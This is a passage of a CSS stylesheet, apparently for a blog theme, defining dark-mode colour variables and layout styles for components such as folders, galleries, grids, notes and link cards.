--theme-codeblock: #283133; --text: #b3f0ff; --text-p1: #9fd2df; --text-p2: #7edaf1; } :root[data-theme=\"dark\"] .colorful[color='red'] { --theme: #f44336; --theme-border: #5c231f; --theme-block: #2f2322; --theme-codeblock: #332928; --text: #ffb8b3; --text-p1: #dfa49f; --text-p2: #f1867e; } :root[data-theme=\"dark\"] .colorful[color='orange'] { --theme: #fa6400; --theme-border: #5c371f; --theme-block: #2f2722; --theme-codeblock: #332d28; --text: #ffd1b3; --text-p1: #dfb99f; --text-p2: #f1ac7e; } :root[data-theme=\"dark\"] .colorful[color='amber'] { --theme: #ffbd2b; --theme-border: #5c491f; --theme-block: #2f2b22; --theme-codeblock: #333028; --text: #ffe7b3; --text-p1: #dfcb9f; --text-p2: #f1cd7e; } :root[data-theme=\"dark\"] .colorful[color='yellow'] { --theme: #f2e03d; --theme-border: #5c561f; --theme-block: #2f2e22; --theme-codeblock: #333228; --text: #fff7b3; --text-p1: #dfd99f; --text-p2: #f1e57e; } :root[data-theme=\"dark\"] .colorful[color='green'] { --theme: #3dc550; --theme-border: #1f5c27; --theme-block: #222f24; --theme-codeblock: #28332a; --text: #b3ffbd; --text-p1: #9fdfa8; --text-p2: #7ef18e; } :root[data-theme=\"dark\"] .colorful[color='cyan'] { --theme: #1bcdfc; --theme-border: #1f4f5c; --theme-block: #222d2f; --theme-codeblock: #283133; --text: #b3efff; --text-p1: #9fd2df; --text-p2: #7ed9f1; } :root[data-theme=\"dark\"] .colorful[color='blue'] { --theme: #2196f3; --theme-border: #1f415c; --theme-block: #222a2f; --theme-codeblock: #282f33; --text: #b3ddff; --text-p1: #9fc3df; --text-p2: #7ebef1; } :root[data-theme=\"dark\"] .colorful[color='purple'] { --theme: #9c27b0; --theme-border: #531f5c; --theme-block: #2d222f; --theme-codeblock: #322833; --text: #f4b3ff; --text-p1: #d69fdf; --text-p2: #e07ef1; } :root[data-theme=\"dark\"] .colorful[color='light'] { --theme-border: #fff; --theme-block: #fff; --text: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } :root[data-theme=\"dark\"] .colorful[color='dark'] { --theme-border: #000; --theme-block: #111; --text: #fff; --text-p1: #fff; --text-p2: #e0e0e0; --text-p3: #ddd; --text-code: #fff; } :root[data-theme=\"dark\"] .colorful[color='warning'], :root[data-theme=\"dark\"] .colorful[color='light'] { --text: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .tag-plugin.tag { --theme: #1cd0fd; --theme-border: #1f505c; --theme-block: #222d2f; --theme-codeblock: #283133; --text: #b3f0ff; --text-p1: #9fd2df; --text-p2: #7edaf1; } :root:not([data-theme]) .colorful[color='red'] { --theme: #f44336; --theme-border: #5c231f; --theme-block: #2f2322; --theme-codeblock: #332928; --text: #ffb8b3; --text-p1: #dfa49f; --text-p2: #f1867e; } :root:not([data-theme]) .colorful[color='orange'] { --theme: #fa6400; --theme-border: #5c371f; --theme-block: #2f2722; --theme-codeblock: #332d28; --text: #ffd1b3; --text-p1: #dfb99f; --text-p2: #f1ac7e; } :root:not([data-theme]) .colorful[color='amber'] { --theme: #ffbd2b; --theme-border: #5c491f; --theme-block: #2f2b22; --theme-codeblock: #333028; --text: #ffe7b3; --text-p1: #dfcb9f; --text-p2: #f1cd7e; } :root:not([data-theme]) .colorful[color='yellow'] { --theme: #f2e03d; --theme-border: #5c561f; --theme-block: #2f2e22; --theme-codeblock: #333228; --text: #fff7b3; --text-p1: #dfd99f; --text-p2: #f1e57e; } :root:not([data-theme]) .colorful[color='green'] { --theme: #3dc550; --theme-border: #1f5c27; --theme-block: #222f24; --theme-codeblock: #28332a; --text: #b3ffbd; --text-p1: #9fdfa8; --text-p2: #7ef18e; } :root:not([data-theme]) .colorful[color='cyan'] { --theme: #1bcdfc; --theme-border: #1f4f5c; --theme-block: #222d2f; --theme-codeblock: #283133; --text: #b3efff; --text-p1: #9fd2df; --text-p2: #7ed9f1; } :root:not([data-theme]) .colorful[color='blue'] { --theme: #2196f3; --theme-border: #1f415c; --theme-block: #222a2f; --theme-codeblock: #282f33; --text: #b3ddff; --text-p1: #9fc3df; --text-p2: #7ebef1; } :root:not([data-theme]) .colorful[color='purple'] { --theme: #9c27b0; --theme-border: #531f5c; --theme-block: #2d222f; --theme-codeblock: #322833; --text: #f4b3ff; --text-p1: #d69fdf; --text-p2: #e07ef1; } :root:not([data-theme]) .colorful[color='light'] { --theme-border: #fff; --theme-block: #fff; --text: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } :root:not([data-theme]) .colorful[color='dark'] { --theme-border: #000; --theme-block: #111; --text: #fff; --text-p1: #fff; --text-p2: #e0e0e0; --text-p3: #ddd; --text-code: #fff; } :root:not([data-theme]) .colorful[color='warning'], :root:not([data-theme]) .colorful[color='light'] { --text: #000; --text-p1: #111; --text-p2: #1f1f1f; --text-p3: #555; --text-code: #fff; } } .md-text .tag-plugin.copy { display: flex; justify-content: space-between; box-sizing: border-box; background: var(--card); border-radius: 8px; border: 1px solid var(--block-border); overflow: hidden; width: 100%; min-width: 200px; } .md-text .tag-plugin.copy span { line-height: 3; padding: 0 1rem; background: var(--block); border-right: 1px solid var(--block-border); color: var(--text-p3); font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; font-size: 0.8125rem; font-weight: 700; flex-shrink: 0; } .md-text .tag-plugin.copy input.copy-area { display: inline-block; padding: 0; width: 100%; color: var(--text-p2); line-height: 3; text-indent: 1rem; } .md-text .tag-plugin.copy button.copy-btn { margin: 2px; border-radius: calc(8px - 2px); display: inline-block; background: none; line-height: 0; font-size: 1rem; padding: 0 0.75rem; color: var(--text-p2); } .md-text .tag-plugin.copy button.copy-btn:hover { background: var(--block-hover); } .md-text .tag-plugin.emoji { display: inline-block; margin: -4px 2px 0; vertical-align: middle; } .md-text .tag-plugin.emoji img { display: block; object-fit: contain; height: 1.75em; border-radius: 0; } .tag-plugin.folders { margin: var(--gap-p) 0; --fsp: calc(17px - 2px); font-size: var(--fsp); border-top: 1px solid var(--block-border); overflow: hidden; } .tag-plugin.folders .folder { border-bottom: 1px solid var(--block-border); padding: 1rem; } .tag-plugin.folders summary { cursor: pointer; color: var(--text-p2); font-weight: 500; position: relative; line-height: 1.2; outline: none; padding: 1rem; margin: -1rem; } .tag-plugin.folders summary:last-child { border-bottom: none; } .tag-plugin.folders summary > span { margin-left: 0.25em; } .tag-plugin.folders summary > p, .tag-plugin.folders summary > h1, .tag-plugin.folders summary > h2, .tag-plugin.folders summary > h3, .tag-plugin.folders summary > h4, .tag-plugin.folders summary > h5, .tag-plugin.folders summary > h6 { display: inline; border-bottom: none !important; } .tag-plugin.folders summary:hover { color: var(--text); } .tag-plugin.folders summary:after { position: absolute; content: '+'; text-align: center; top: 50%; transform: translateY(-50%); right: 1rem; } .tag-plugin.folders details[open] >summary { color: var(--text-p1); font-weight: 700; } .tag-plugin.folders details[open] >summary:after { content: '-'; } .tag-plugin.folders details[open] >div.body { --fsp: calc(17px - 1px); } .tag-plugin.folders details[open] >div.body >:first-child { margin-top: 1rem; } .tag-plugin.folders details[open] >div.body >:last-child { margin-bottom: 0; } details.folding { display: block; padding: 1rem; margin: 1rem 0; border-radius: 12px; background: var(--theme-block); border: 1px solid var(--theme-border); } details.folding summary { cursor: pointer; padding: 1rem; margin: -1rem; color: var(--text-p2); font-weight: 500; --fsp: calc(17px - 2px); font-size: var(--fsp); position: relative; line-height: 1.2; outline: none; } details.folding summary > span { margin-left: 0.25em; } details.folding summary > p, details.folding summary > h1, details.folding summary > h2, details.folding summary > h3, details.folding summary > h4, details.folding summary > h5, details.folding summary > h6 { display: inline; border-bottom: none !important; } details.folding summary:hover { color: var(--text); } details.folding summary:after { position: absolute; content: '+'; text-align: center; top: 50%; transform: translateY(-50%); right: 1rem; line-height: 1; } details.folding[open] >summary { color: var(--text-p1); font-weight: 700; z-index: 1; } details.folding[open] >summary:after { content: '-'; } details.folding[open] >div.body { padding: 0 1rem 1rem; margin: 0 -1rem -1rem; color: var(--text-p1); --fsp: calc(17px - 1px); } details.folding[open] >div.body >:first-child { margin-top: 1rem; } details.folding[open] >div.body >:last-child { margin-bottom: 0; } details.folding[child=codeblock]>div.body { padding: 0; background: transparent; overflow: hidden; } details.folding[child=codeblock]>div.body .highlight { border: none; border-radius: 0; background: transparent; margin: 0; } details.folding[child=codeblock]>div.body .highlight figcaption { display: none; } details.folding[child=codeblock]>div.body .highlight figcaption span { background: var(--theme-block); } details.folding[child=codeblock]>div.body .highlight .code:before { content: none; } details.folding[child=codeblock]>div.body .highlight+.highlight { border-top: 1px dashed var(--theme-border); border-top-left-radius: 0; border-top-right-radius: 0; } details.folding[child=iframe] { overflow: hidden; background: none; } details.folding[child=iframe] >summary { background: none; } details.folding[child=iframe] >div.body { padding: 0; background: none; overflow: hidden; } .md-text .frame-wrap { position: relative; overflow: hidden; margin: 0 auto; max-width: 100%; display: flex; flex-direction: column; align-items: center; } .md-text .frame-wrap img, .md-text .frame-wrap video { border-radius: 0; } .md-text .frame-wrap .frame { z-index: 1; display: block; position: absolute; background-size: 100%; background-repeat: no-repeat; overflow: hidden; } .md-text .tag-plugin.img-wrap .frame-wrap[focus] { height: auto; } .md-text .frame-wrap#iphone11 img, .md-text .frame-wrap#iphone11 video { width: 287px; margin-top: 19px; margin-bottom: 20px; } .md-text .frame-wrap#iphone11 .frame { background-image: url(\"https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/frame/iphone11.svg\"); width: 329px; height: 658px; } .md-text .frame-wrap[focus='top'] img, .md-text .frame-wrap[focus='top'] video { margin-bottom: 0 !important; } .md-text .frame-wrap:not([focus='bottom']) .frame { top: 0; } .md-text .frame-wrap[focus='bottom'] img, .md-text .frame-wrap[focus='bottom'] video { bottom: 0; margin-top: 0 !important; } .md-text .frame-wrap[focus='bottom'] .frame { bottom: 0; } @media screen and (max-width: 500px) { .md-text .frame-wrap#iphone11 img, .md-text .frame-wrap#iphone11 video { width: 208px; margin-top: 13px; margin-bottom: 14px; } .md-text .frame-wrap#iphone11 .frame { width: 238px; height: 476px; } } .users-wrap .grid-box { display: grid; grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); } .users-wrap .user-card .card-link { color: var(--text-p1); font-size: 10px; font-weight: 500; display: flex; justify-content: flex-start; flex-direction: column; align-items: center; text-align: center; line-height: 1.2; border-radius: 4px; overflow: hidden; position: relative; padding: 1rem 0.5rem; } .users-wrap .user-card .card-link .name { max-width: 100%; display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 2; } .users-wrap .user-card .card-link img { object-fit: cover; display: block; width: 48px; height: 48px; background: var(--card); border-radius: 64px; margin: 0 0 0.5rem; } .users-wrap .user-card .card-link >img { transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; -moz-transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; -webkit-transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; -o-transition: transform 0.2s ease-out, box-shadow 0.2s ease-out; } .users-wrap .user-card .card-link:hover { background: var(--block-hover); } .users-wrap .user-card .card-link:hover img { transform: scale(1.2) rotate(8deg); box-shadow: 0 12px 16px -4px rgba(0,0,0,0.2); } .tag-plugin.gallery .grid-cell, .tag-plugin.gallery .flow-cell { display: block; overflow: hidden; z-index: 0; position: relative; } .tag-plugin.gallery .grid-cell:hover .image-meta, .tag-plugin.gallery .flow-cell:hover .image-meta { background: rgba(0,0,0,0.5); } .tag-plugin.gallery .grid-cell:hover .image-caption, .tag-plugin.gallery .flow-cell:hover .image-caption { color: #fff; } .tag-plugin.gallery img { object-fit: cover; max-height: 100%; display: block; } .tag-plugin.gallery .image-meta { position: absolute; z-index: 1; top: 0; left: 0; right: 0; bottom: 0; pointer-events: none; background: transparent; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; display: flex; flex-direction: column; justify-content: flex-end; } .tag-plugin.gallery .image-meta .image-caption { display: block; font-size: 0.8125rem; color: transparent; pointer-events: none; line-height: 1.2; margin: 0.5rem; transition: color 0.2s ease-out; -moz-transition: color 0.2s ease-out; -webkit-transition: color 0.2s ease-out; -o-transition: color 0.2s ease-out; text-align: left; } .tag-plugin.gallery .image-meta .image-caption:empty { display: none; } .tag-plugin.gallery .grid-cell >img { transition: transform 0.5s ease-out; -moz-transition: transform 0.5s ease-out; -webkit-transition: transform 0.5s ease-out; -o-transition: transform 0.5s ease-out; } .tag-plugin.gallery .grid-cell:hover >img { transform: scale(1.1); } .tag-plugin.gallery.grid-box { display: grid; } .tag-plugin.gallery.grid-box[size='xs'] { grid-template-columns: repeat(auto-fill, minmax(80px, 1fr)); grid-gap: 2px; } .tag-plugin.gallery.grid-box[size='xs'] .grid-cell, .tag-plugin.gallery.grid-box[size='xs'] img { border-radius: 2px; } .tag-plugin.gallery.grid-box[size='xs'] .image-caption { font-size: 0.75rem; } .tag-plugin.gallery.grid-box[size='s'] { grid-template-columns: repeat(auto-fill, minmax(100px, 1fr)); grid-gap: 2px; } .tag-plugin.gallery.grid-box[size='s'] .grid-cell, .tag-plugin.gallery.grid-box[size='s'] img { border-radius: 2px; } .tag-plugin.gallery.grid-box[size='m'] { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); grid-gap: 4px; } .tag-plugin.gallery.grid-box[size='m'] .grid-cell, .tag-plugin.gallery.grid-box[size='m'] img { border-radius: 4px; } .tag-plugin.gallery.grid-box[size='l'] { grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); grid-gap: 8px; } .tag-plugin.gallery.grid-box[size='l'] .grid-cell, .tag-plugin.gallery.grid-box[size='l'] img { border-radius: 8px; } .tag-plugin.gallery.grid-box[size='xl'] { grid-template-columns: repeat(2, 1fr); grid-gap: 16px; } .tag-plugin.gallery.grid-box[size='xl'] .grid-cell, .tag-plugin.gallery.grid-box[size='xl'] img { border-radius: 16px; } .tag-plugin.gallery.grid-box[size='mix'] { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); grid-gap: 4px; } .tag-plugin.gallery.grid-box[size='mix'] .grid-cell, .tag-plugin.gallery.grid-box[size='mix'] img { border-radius: 4px; } .tag-plugin.gallery.grid-box[size='mix'] .grid-cell:nth-child(3n+1) { grid-column: auto/span 2; grid-row: auto/span 2; } .tag-plugin.gallery.grid-box[ratio='square'] .grid-cell { aspect-ratio: 1; } .tag-plugin.gallery.grid-box[ratio='portrait'] .grid-cell { aspect-ratio: 2/3; } .tag-plugin.gallery.grid-box .grid-cell { background: var(--block); } .tag-plugin.gallery.grid-box .grid-cell img { width: 100%; height: 100%; } .tag-plugin.gallery.flow-box { column-count: 3; column-gap: 8px; } .tag-plugin.gallery.flow-box .flow-cell { border-radius: 8px; padding-bottom: 8px; } .tag-plugin.gallery.flow-box .flow-cell img { width: 100%; height: 100%; } .tag-plugin.gallery.flow-box .image-meta { border-radius: 8px; margin-bottom: 8px; } .tag-plugin.ghcard { line-height: 0; } .tag-plugin.ghcard a.ghcard { display: inline-block; } .tag-plugin.grid { display: grid; grid-gap: 16px; } .tag-plugin.grid[bg]>.cell> p { line-height: 1.5; } .tag-plugin.grid[bg]>.cell> :first-child { margin-top: 0; } .tag-plugin.grid[bg]>.cell> :last-child { margin-bottom: 0; } .tag-plugin.grid[bg]>.cell> p:first-child { margin-top: -0.25em; } .tag-plugin.grid[bg]>.cell> p:last-child { margin-bottom: -0.25em; } .tag-plugin.grid[bg]>.cell { padding: 1rem; border-radius: 12px; } .tag-plugin.grid[bg='box']>.cell { background: var(--block); } .tag-plugin.grid[bg='card']>.cell { background: var(--card); transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } :root[data-theme=\"light\"] .tag-plugin.grid[bg='card']>.cell { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root[data-theme=\"light\"] .tag-plugin.grid[bg='card']>.cell:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } :root[data-theme=\"dark\"] .tag-plugin.grid[bg='card']>.cell:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } :root:not([data-theme]) .tag-plugin.grid[bg='card']>.cell { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root:not([data-theme]) .tag-plugin.grid[bg='card']>.cell:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .tag-plugin.grid[bg='card']>.cell:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } } .md-text .tag-plugin.hashtag { padding: 0px 8px; border-radius: 100px; background: var(--theme-block); color: var(--text-p2); margin: 2px 0; display: inline-flex; align-items: center; --fsp: calc(17px - 2px); font-size: var(--fsp); font-weight: 500; transition: background 0.2s ease-out, color 0.2s ease-out; -moz-transition: background 0.2s ease-out, color 0.2s ease-out; -webkit-transition: background 0.2s ease-out, color 0.2s ease-out; -o-transition: background 0.2s ease-out, color 0.2s ease-out; } .md-text .tag-plugin.hashtag span { margin: 0 2px; } .md-text .tag-plugin.hashtag:hover { background: var(--text-p2); color: var(--theme-block); } span.tag-plugin.icon { display: inline-block; margin: -4px 1px 0; vertical-align: middle; } span.tag-plugin.icon svg, span.tag-plugin.icon img { display: block; height: 1.5em; width: auto; } span.tag-plugin.icon svg { color: var(--theme); } span.tag-plugin.icon img { object-fit: contain; } p>strong>span.tag-plugin.icon { margin: -4px 4px 0 0; } .tag-plugin.icon-wrap span.tag-plugin.icon { margin-right: 4px; } .tag-plugin.image { margin-top: 1rem; margin-bottom: 1rem; } .tag-plugin.image .image-bg { text-align: center; border-radius: 12px; position: relative; overflow: hidden; } .tag-plugin.image .image-bg:hover .image-download { opacity: 1 !important; } .tag-plugin.image .image-bg img { display: block; object-fit: cover; } .tag-plugin.image .image-bg .image-download { position: absolute; bottom: 8px; right: 8px; font-size: 1.125rem; padding: 6px; line-height: 0; border-radius: 40px; transition: color 0.2s ease-out, opacity 0.2s ease-out, background 0.2s ease-out; -moz-transition: color 0.2s ease-out, opacity 0.2s ease-out, background 0.2s ease-out; -webkit-transition: color 0.2s ease-out, opacity 0.2s ease-out, background 0.2s ease-out; -o-transition: color 0.2s ease-out, opacity 0.2s ease-out, background 0.2s ease-out; color: var(--text-p1); } .tag-plugin.image .image-bg .image-download:hover { background: var(--card) !important; color: #1cd0fd; } .tag-plugin.image .image-meta { display: flex; justify-content: center; padding: 0.5rem 0; } .tag-plugin.image .image-meta .image-caption { display: inline-block; font-size: 0.8125rem; color: var(--text-p2); line-height: 1.5; text-align: justify; } .tag-plugin.image .image-meta .image-caption:empty { display: none; } .md-text .tag-plugin.paper { display: flex; flex-direction: column; align-items: center; padding-top: var(--gap-padding); padding-bottom: var(--gap-padding); } .md-text .tag-plugin.paper >.content { border-left: 1px dashed var(--text-meta); border-right: 1px dashed var(--text-meta); border-bottom: 1px dashed var(--text-meta); border-bottom-left-radius: 12px; border-bottom-right-radius: 12px; padding: 1rem; max-width: calc(95%); } .md-text .tag-plugin.paper >.content >.title { font-weight: 500; text-align: center; } .md-text .tag-plugin.paper >.content >.meta { color: var(--text-p2); font-size: 0.75rem; font-weight: 500; } .md-text .tag-plugin.paper >.content >.body >.paragraph { text-indent: 2em; } .md-text .tag-plugin.paper >.content >.body >.section >.section-title { text-align: center; } .md-text .tag-plugin.paper >.content >.body >.section >.section-content { text-indent: 2em; } .md-text .tag-plugin.paper >.content >.body >.line.right >p { text-align: right; } .md-text .tag-plugin.paper >.content >.body .tag-plugin { margin: 0; } .md-text .tag-plugin.paper >.content >.footer { color: var(--text-p4); font-size: 0.75rem; text-align: right; } .md-text .tag-plugin.paper >.content >.footer >.author-date { text-align: right; } .md-text .tag-plugin.paper >.content >.footer >.author-date >span { color: var(--text-p2); font-size: 0.75rem; font-weight: 500; } .md-text .tag-plugin.paper >.content >.footer >.author-date >.author { margin-right: calc(0.5 * var(--gap-p)); } .md-text .tag-plugin.paper>.content { position: relative; } .md-text .tag-plugin.paper>.content:before { content: ''; position: absolute; height: 4px; left: -16px; top: -4px; right: -16px; border-radius: 4px; background: var(--block); } .md-text .tag-plugin.paper>.content >.title { position: relative; } .md-text .tag-plugin.paper>.content >.title:before { content: ''; position: absolute; height: 4px; left: calc(-1rem - 6px); top: calc(-1rem - 4px); right: calc(100% + 1rem - 6px); border-radius: 4px; background: #ff5724; } .md-text .tag-plugin.paper>.content >.title:after { content: ''; position: absolute; height: 4px; right: calc(-1rem - 6px); top: calc(-1rem - 4px); left: calc(100% + 1rem - 6px); border-radius: 4px; background: #ff5724; } .md-text .tag-plugin.paper > .content.underline > .title, .md-text .tag-plugin.paper > .content.underline > .meta, .md-text .tag-plugin.paper > .content.underline > .author-date, .md-text .tag-plugin.paper > .content.underline > .footer, .md-text .tag-plugin.paper > .content.underline > .body { background: linear-gradient(transparent 1.5rem, var(--text-meta) 1px); background-size: 100% calc(1.5rem + 1px); line-height: calc(1.5rem + 1px); padding: 0 3px; } .md-text .tag-plugin.paper > .content.underline p { margin: 0; } .md-text .tag-plugin.paper > .content.underline >.title { border-top: 1px solid var(--text-meta); } .md-text .tag-plugin.reel { display: flex; flex-direction: column; align-items: center; padding-top: var(--gap-padding); padding-bottom: var(--gap-padding); } .md-text .tag-plugin.reel >.content { display: flex; flex-direction: column; writing-mode: vertical-rl; border-top: 1px dashed var(--text-meta); border-bottom: 1px dashed var(--text-meta); max-width: calc(100% - 80px); padding: 1rem; } .md-text .tag-plugin.reel >.content >.title { font-weight: 500; font-size: 1rem; } .md-text .tag-plugin.reel >.content >.meta { color: var(--text-p2); font-size: 0.75rem; font-weight: 500; } .md-text .tag-plugin.reel >.content >.body { overflow: auto; margin: calc(var(--gap-padding) - 4px); } .md-text .tag-plugin.reel >.content >.body::-webkit-scrollbar { height: 4px; width: 4px; } .md-text .tag-plugin.reel >.content >.body::-webkit-scrollbar-track-piece { background: transparent; } .md-text .tag-plugin.reel >.content >.body::-webkit-scrollbar-thumb { background: var(--text-meta); cursor: pointer; border-radius: 2px; } .md-text .tag-plugin.reel >.content >.body::-webkit-scrollbar-thumb:hover { background: var(--text-p3); } .md-text .tag-plugin.reel >.content >.body .main p { margin: 0; font-size: 0.875rem; } .md-text .tag-plugin.reel >.content >.date { color: var(--text-p2); font-size: 0.75rem; font-weight: 500; text-align: right; } .md-text .tag-plugin.reel >.content >.footer { color: var(--text-p4); font-size: 0.75rem; text-align: right; } .md-text .tag-plugin.reel>.content { position: relative; } .md-text .tag-plugin.reel>.content:before { content: ''; position: absolute; width: 4px; left: -4px; top: -16px; bottom: -16px; border-radius: 4px; background: var(--block); } .md-text .tag-plugin.reel>.content:after { content: ''; position: absolute; width: 4px; left: calc(100%); top: -16px; bottom: -16px; border-radius: 4px; background: var(--block); } .md-text .tag-plugin.reel>.content >.title { position: relative; } .md-text .tag-plugin.reel>.content >.title:before { content: ''; position: absolute; width: 4px; right: calc(-1rem - 4px); top: calc(-1rem - 6px); bottom: calc(100% + 1rem - 6px); border-radius: 4px; background: #ff5724; z-index: 1; } .md-text .tag-plugin.reel>.content >.title:after { content: ''; position: absolute; width: 4px; right: calc(-1rem - 4px); top: calc(100% + 1rem - 6px); bottom: calc(-1rem - 6px); border-radius: 4px; background: #ff5724; z-index: 1; } .md-text .tag-plugin.reel>.content >.footer { position: relative; } .md-text .tag-plugin.reel>.content >.footer:before { content: ''; position: absolute; width: 4px; left: calc(-1rem - 4px); top: calc(-1rem - 6px); bottom: calc(100% + 1rem - 6px); border-radius: 4px; background: #ff5724; } .md-text .tag-plugin.reel>.content >.footer:after { content: ''; position: absolute; width: 4px; left: calc(-1rem - 4px); top: calc(100% + 1rem - 6px); bottom: calc(-1rem - 6px); border-radius: 4px; background: #ff5724; } .md-text u { text-decoration: none; border-bottom: 2px solid #ff5724; } .md-text emp { width: fit-content; text-decoration: none; border-bottom: 4px dotted #ff5724; } .md-text wavy { text-decoration: underline wavy #ff5724; } .md-text del { color: var(--text-p3); text-decoration: line-through var(--text-p3); } .md-text kbd { border-radius: 4px; border: 1px solid #d2d2d2; border-bottom-width: 2px; background: var(--card); padding: 2px 4px 1px 4px; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; font-weight: 700; } .md-text psw { color: transparent; background: #a1a1a1; border-radius: 2px; transition: background 0.2s ease-out; -moz-transition: background 0.2s ease-out; -webkit-transition: background 0.2s ease-out; -o-transition: background 0.2s ease-out; margin: auto 2px; } .md-text psw:hover { color: inherit; background: none; } .md-text sup, .md-text sub { color: var(--theme); line-height: 1; font-weight: 700; font-family: Menlo, Monaco, Consolas, system-ui, \"Courier New\", monospace, sans-serif; } .md-text h1 sup, .md-text h2 sup, .md-text h3 sup, .md-text h4 sup, .md-text h1 sub, .md-text h2 sub, .md-text h3 sub, .md-text h4 sub { font-size: 0.85rem; } .md-text .tag-plugin.link { margin: 1em auto; display: flex; justify-content: center; } .md-text .link-card { background: var(--card); display: inline-flex; justify-content: space-between; align-items: center; cursor: pointer; width: 300px; max-width: 100%; border-radius: 12px; transition: all 0.2s ease-out; -moz-transition: all 0.2s ease-out; -webkit-transition: all 0.2s ease-out; -o-transition: all 0.2s ease-out; } :root[data-theme=\"light\"] .md-text .link-card { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root[data-theme=\"light\"] .md-text .link-card:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } :root[data-theme=\"dark\"] .md-text .link-card:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } :root:not([data-theme]) .md-text .link-card { box-shadow: 0 1px 2px 0px rgba(0,0,0,0.1); } :root:not([data-theme]) .md-text .link-card:hover { box-shadow: 0 12px 20px -4px rgba(0,0,0,0.15); transform: translate3d(0, -2px, 0); } @media (prefers-color-scheme: dark) { :root:not([data-theme]) .md-text .link-card:hover { box-shadow: 0 0 4px -2px #1cd0fd, 0 0 24px -8px #1cd0fd; } } .md-text .link-card.plain { flex-direction: row; align-items: center; } .md-text .link-card.rich { flex-direction: column; align-items: stretch; width: 460px; text-align: justify; } .md-text .link-card >.left { overflow: hidden; margin: 0.75rem 0 0.75rem 0.75rem; } .md-text .link-card >.left .title { font-size: 0.875rem; } .md-text .link-card >.left span+span { margin-top: 0.25rem; } .md-text .link-card >.right { width: 2.75rem; height: 2.75rem; margin: 0.75rem; overflow: hidden; flex-shrink: 0; } .md-text .link-card >.top { display: flex; margin: 1rem 1rem 0.75rem; overflow: hidden; max-width: calc(100% - 1rem * 2); align-items: center; } .md-text .link-card >.top .img { line-height: 0; height: 16px; width: 16px; border-radius: 16px; margin-right: 8px; background-repeat: no-repeat; background-size: contain; background-position: left center; } .md-text .link-card >.top span { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: 100%; } .md-text .link-card >.bottom { margin: 0 1rem 1rem; } .md-text .link-card >.bottom .title { font-size: 1rem; margin-bottom: 0.5rem; } .md-text .link-card { line-height: 1.2; } .md-text .link-card .title { display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 2; } .md-text .link-card .cap { flex-shrink: 0; color: var(--text-p3); } .md-text .link-card .link { line-height: 1.5; opacity: 0.75; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; } .md-text .link-card .desc { display: -webkit-box; -webkit-box-orient: vertical; overflow: hidden; -webkit-line-clamp: 3; } .md-text .link-card .img { border-radius: 4px; } .md-text .link-card span { margin: 0; display: block; } .md-text .link-card .title { font-weight: 500; color: var(--text-p1); } .md-text .tag-plugin.mark { padding: 1px 2px; border-radius: 2px; background: var(--theme-block); color: var(--text); } .tag-plugin.video { line-height: 0; margin: auto; } .tag-plugin.video video, .tag-plugin.video iframe { border-radius: 12px; box-shadow: 0 12px 16px -4px rgba(0,0,0,0.2); z-index: 1; background: var(--block); width: 100%; height: 100%; margin: 0; } .tag-plugin.navbar { padding: 0; } .tag-plugin.navbar:after { left: 0; right: 0; } @media screen and (min-width: 667px) { .tag-plugin.navbar nav a { margin-top: 2px; } } .md-text .tag-plugin.note { position: relative; padding: 0.25rem 1rem; border-radius: 12px; background: var(--theme-block); overflow: hidden; border: 1px solid var(--theme-border); color: var(--text-p1); } .md-text .tag-plugin.note >.title { --fsp: calc(17px - 1px); font-size: var(--fsp); line-height: 1.5; margin-top: var(--gap-p-compact); font-weight: 500; color: var(--text); } .md-text .tag-plugin.note >.body { margin-top: var(--gap-p-compact); margin-bottom: var(--gap-p-compact); } .md-text .tag-plugin.note >.body, .md-text .tag-plugin.note >.body p { --fsp: calc(17px - 2px); font-size: var(--fsp); line-height: 1.5; } .md-text .tag-plugin.note >.body:only-child { margin: calc(var(--gap-p) - 0.25rem) 0; } .md-text .tag-plugin.note[color] code { background: none; } .md-text .tag-plugin.note:not([color]) .highlight { background: var(--block-hover); } .md-text .tag-plugin.note[child=codeblock] { padding: 0; background: var(--theme-codeblock); } .md-text .tag-plugin.note[child=codeblock] >.title, .md-text .tag-plugin.note[child=codeblock] >.body:only-child { margin-top: 0; } .md-text .tag-plugin.note[child=codeblock] >.body { margin-bottom: 0; } .md-text .tag-plugin.note[child=codeblock] .highlight { margin: 0; border: none; background: none; } .md-text .tag-plugin.note[child=codeblock] .highlight figcaption span { background: var(--theme-block); } .md-text .tag-plugin.note[child=codeblock] .highlight+.highlight { 